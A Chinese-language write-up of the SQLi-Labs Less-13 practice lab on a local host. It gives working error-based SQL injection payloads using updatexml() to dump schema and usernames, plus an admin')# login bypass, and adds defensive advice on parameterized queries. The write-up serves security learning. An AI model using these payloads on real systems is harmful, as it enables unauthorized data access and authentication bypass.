SQLi-Labs Less-13

2026年9月26日 SQLi-Labs Web安全 SQL注入 POST双注入

一、题目信息

  • 题目名称：SQLi-Labs Less-13 (POST - Double Injection - Single quotes- String - with twist)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / POST型报错注入 / 单引号加括号闭合
  • 靶场链接：http://localhost:8081/Less-13/（本地环境）
  • 涉及工具：Chrome浏览器 (F12开发者工具)

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于单引号加括号闭合的 POST 型报错注入（Double Injection）。Less-11 是单引号，Less-12 是双引号加括号，而 Less-13 则是单引号加括号 ')。并且由于页面会直接回显 SQL 报错信息，我们依然可以使用 updatexml() 函数进行报错注入，从而快速获取数据库信息并最终登录。

2. 怎么想（破题思路）

  • 尝试 admin')，页面报错，确认单引号加括号闭合。
  • 利用报错函数 updatexml 爆出数据库名 security。
  • 查阅 information_schema.tables 和 columns，获取表名 users 和字段名。
  • 爆出用户名 Dumb，利用靶场默认弱口令特性，直接使用 Dumb/Dumb 登录。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：获取表名时出现字符集冲突

踩坑情况：输入 admin') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)# 时，页面报错 Illegal mix of collations...。

原因分析：系统数据库 information_schema 是 GBK 字符集，而靶场是 latin1，直接比较会冲突。

改进方式：用十六进制表示字符串，把 'users' 写成 0x7573657273，或者使用 database() 替代 'security'。

踩坑记录二：无法直接查密码（回显截断）

踩坑情况：尝试查密码时，页面报错只有 XPATH syntax error: '~'，无法回显密码内容。

原因分析：updatexml 报错回显最长只有 32 个字符，而密码的 MD5 通常是 32 位，加上前后的 ~ 符号会超长被截断。

改进方式：使用 substr() 分段获取（如前30位+后2位拼接）。或者像本次通关一样，先爆出用户名 Dumb，由于靶场密码就是明文 Dumb，直接成功登录即可。无需死磕密码脱库。

详细实操步骤（Payload逐字解释）

第一步：探测闭合方式

Username 输入 admin')，Password 随便填。报错提示 near '') and password=('123') LIMIT 0,1'，说明闭合方式为 ')。

第二步：获取数据库名

admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#

逐字解析：

  • admin')：闭合原SQL中的 username=('。
  • updatexml(1, XPath格式字符串, 1)：利用其解析错误抛出第二个参数的字符串。这是报错注入的核心。
  • concat(0x7e, (select database()), 0x7e)：拼接波浪号 ~ 作为边界，中间放入查询库名的子查询。
  • #：注释掉后续的密码验证及 LIMIT 限制。

回显：XPATH syntax error: '~security~'

第三步：获取表名与列名

查表名（用十六进制避开字符集冲突）：

admin') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

回显 ~users~。接着查列名（把 tables 换成 columns）：

admin') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

修改 limit 依次得到 ~id~、~username~、~password~。

第四步：爆出用户名并登录

admin') and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#

成功拿到 ~Dumb~。最后回到登录框，Username 填 Dumb，Password 填 Dumb，成功登录（也可使用万能密码 admin')# 直接登录）。

4. 怎么迁移（跨领域联想）

  • 代码审计与安全开发：冗余的括号 ('$username') 是开发人员为了代码风格统一或习惯性操作引入的。在代码审计中，这种非标准写法往往可能带来额外的注入风险。安全开发必须坚持使用 PDO 或 MySQLi 参数化查询。
  • 逻辑漏洞挖掘：本次通关利用了“用户名密码相同”的弱口令逻辑。在真实渗透测试中，弱口令（如 admin/admin, test/test）是获取权限的最常见突破口，与 SQL 注入属于不同维度的攻击面。

三、名词大全与原理深度复盘

1. Double Injection（双注入）

官方标签里的 Double Injection 有时指联合注入、报错注入，或在 SQLi-Labs 中指代包含子查询的注入。在此关中，我们通过 updatexml 报错回显，本质上是基于报错的注入。

2. updatexml() 回显原理

updatexml(XML_document, XPath_string, new_value) 的第二个参数必须符合 XPath 语法。当传入 ~security~ 时，解析失败，MySQL 抛出 XPATH syntax error 并将错误内容显示在页面上。回显长度上限 32 字节。

3. 万能密码原理

利用 # 或 -- 注释符，把原 SQL 中密码校验的部分注释掉，使得后端只验证用户名。只要用户名存在，SELECT 就能查到结果，绕过密码验证。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-11 的区别：闭合方式从 ' 变成了 ')。
  • 与 Less-12 的区别：Less-12 是 ")，Less-13 是 ')。Less-11/12 是 Error Based，Less-13 官方标记为 Double Injection，但在实际操作中两者都依赖报错回显。

2. 这种题目的出现原因（为什么存在）

随着开发框架的演进，开发者有时会使用括号来明确 SQL 运算优先级，却忽略了他们仍然在使用字符串拼接的方式构建 SQL。这就导致了各种变形闭合方式的出现。

3. 这种应用在实际中如何体现？

在实际攻防中，遇到不报错的场景（盲注），时间成本极高。一旦发现页面抛出报错，渗透测试人员会首选报错注入（如 updatexml、extractvalue、floor 等），这也是为什么生产环境必须关闭 `display_errors` 并统一处理异常。

4. 如何抽象理解概念（大白话）

把数据库比作“带警报器的保险箱”：

  • Less-13 的锁孔变成了 ') 形状。塞对了钥匙，保险箱不仅会打开，还会因为识别到异常而“报警”（报错回显），把里面的秘密直接喊出来。这就是报错注入的直观理解。
